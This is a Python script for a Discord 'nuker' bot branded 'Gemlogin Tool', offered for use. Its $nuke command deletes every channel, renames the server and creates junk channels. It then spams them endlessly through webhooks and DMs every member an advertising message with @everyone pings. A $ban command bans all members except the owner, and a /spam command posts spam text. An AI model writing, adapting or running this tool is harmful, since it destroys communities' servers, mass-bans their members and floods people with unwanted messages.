import os
import sys
import yaml
import asyncio
import random
import discord
from discord import app_commands
from discord.ext import commands
from pystyle import Write, Colors

CONFIG_FILE = "config.yml"

WEBHOOK_NAME = "NUKED BY GEMLOGIN TOOL"
WEBHOOK_AVATAR_URL = "https://tuanluupiano.com/wp-content/uploads/2026/01/avatar-anime-nu-9.jpg"

def get_token():
    token = ""
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                config = yaml.safe_load(f)
                if config and isinstance(config, dict):
                    token = config.get("token", "")
        except Exception:
            pass
            
    if not token:
        token = Write.Input("[/>] Enter Your Bot Token ", Colors.purple_to_blue, interval=0.02)
        token = token.strip()
        if token:
            try:
                with open(CONFIG_FILE, "w", encoding="utf-8") as f:
                    yaml.safe_dump({"token": token}, f)
            except Exception:
                pass
    return token

token = get_token()
if not token:
    sys.exit()

masked_token = token[:10] + "..." if len(token) > 10 else token
Write.Print(f"Logging to token [{masked_token}]\n", Colors.purple_to_blue, interval=0.02)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="$", intents=intents)

def get_spam_text():
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            config = yaml.safe_load(f)
            if config and isinstance(config, dict):
                return config.get("spam_text", "")
    except Exception:
        pass
    return ""

class SpamButton(discord.ui.View):
    def __init__(self, spam_text):
        super().__init__(timeout=None)
        self.spam_text = spam_text

    @discord.ui.button(label="Click here to spam message", style=discord.ButtonStyle.danger, emoji="🔥")
    async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)
        for _ in range(5):
            try:
                await interaction.followup.send(self.spam_text, ephemeral=False)
            except Exception:
                pass

@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.offline)
    try:
        await bot.tree.sync()
    except Exception:
        pass
    Write.Print(f"Logged as [{bot.user}]\n", Colors.purple_to_blue, interval=0.02)

@bot.tree.command(name="spam", description="Spam a message from config")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def spam_slash(interaction: discord.Interaction):
    spam_text = get_spam_text()
    if not spam_text:
        await interaction.response.send_message("No spam_text found in config.yml!", ephemeral=True)
        return
    view = SpamButton(spam_text)
    await interaction.response.send_message("Press the button to spam:", view=view, ephemeral=True)

@bot.command()
async def nuke(ctx):
    guild = ctx.guild
    channels_to_delete = guild.channels
    y_delete = len(channels_to_delete)
    x_delete = 0
    
    from pystyle import Colorate
    
    def print_gradient(text, end=""):
        colored = Colorate.Horizontal(Colors.purple_to_blue, text)
        sys.stdout.write(colored + end)
        sys.stdout.flush()

    for future in asyncio.as_completed([channel.delete() for channel in channels_to_delete]):
        try:
            await future
        except Exception:
            pass

    emojis = [
        "😀", "😃", "😄", "😁", "😆", "😅", "😂", "🤣", "😊", "😇",
        "🙂", "🙃", "😉", "😌", "😍", "🥰", "😘", "😗", "😙", "😚",
        "😋", "😛", "😝", "😜", "🤪", "🤨", "🧐", "🤓", "😎", "🤩",
        "🥳", "😏", "😒", "😞", "😔", "😟", "😕", "🙁", "☹️", "😣",
        "😖", "😫", "😩", "🥺", "😢", "😭", "😤", "😠", "😡", "🤬",
        "🤯", "😳", "🥵", "🥶", "😱", "😨", "😰", "😥", "😓", "🤗",
        "🤔", "🤭", "🤫", "🤥", "😶", "😐", "😑", "😬", "🙄", "😯",
        "😦", "😧", "😮", "😲", "🥱", "😴", "🤤", "😪", "😵", "🤐",
        "🥴", "🤢", "🤮", "🤧", "😷", "🤒", "🤕", "🤑", "🤠", "😈",
        "👿", "👹", "👺", "🤡", "💩", "👻"
    ]
    
    y_create = 20
    
    create_coroutines = [guild.create_text_channel(f"{random.choice(emojis)} tuanhai") for _ in range(y_create)]
    new_channels = []
    
    for future in asyncio.as_completed(create_coroutines):
        try:
            ch = await future
            if isinstance(ch, discord.TextChannel):
                new_channels.append(ch)
        except Exception:
            pass

    try:
        await guild.edit(name="Nuked by Gemlogin Tool")
    except Exception:
        pass

    message = """## this server nuked by Gemlogin Tool

https://discord.gg/pMe5DhSDyB

trash server need to be removed :joy: :thumbsdown: 


## JOIN THIS SERVER TO GET FREE TOOL AND LOTS OF THINGS ETC

@everyone @here"""

    webhooks = []
    for channel in new_channels:
        try:
            webhook = await channel.create_webhook(
                name=WEBHOOK_NAME,
                avatar=None
            )
            webhooks.append(webhook)
        except Exception:
            pass

    async def spam_via_webhook(webhook):
        while True:
            try:
                await webhook.send(
                    message,
                    username=WEBHOOK_NAME,
                    avatar_url=WEBHOOK_AVATAR_URL
                )
            except Exception:
                pass
            await asyncio.sleep(0)

    for webhook in webhooks:
        asyncio.create_task(spam_via_webhook(webhook))
        
    async def dm_member(member):
        try:
            await member.send(message)
        except Exception:
            pass

    for member in guild.members:
        if member != bot.user:
            asyncio.create_task(dm_member(member))

@bot.command()
async def ban(ctx):
    guild = ctx.guild
    async def ban_member(member):
        try:
            await member.ban(reason="Nuked by Gemlogin Tool")
        except Exception:
            pass

    ban_coroutines = []
    for member in guild.members:
        if member != bot.user and member != guild.owner:
            ban_coroutines.append(ban_member(member))

    for future in asyncio.as_completed(ban_coroutines):
        try:
            await future
        except Exception:
            pass

try:
    bot.run(token, log_handler=None)
except Exception:
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "w", encoding="utf-8") as f:
                yaml.safe_dump({"token": ""}, f)
        except Exception:
            pass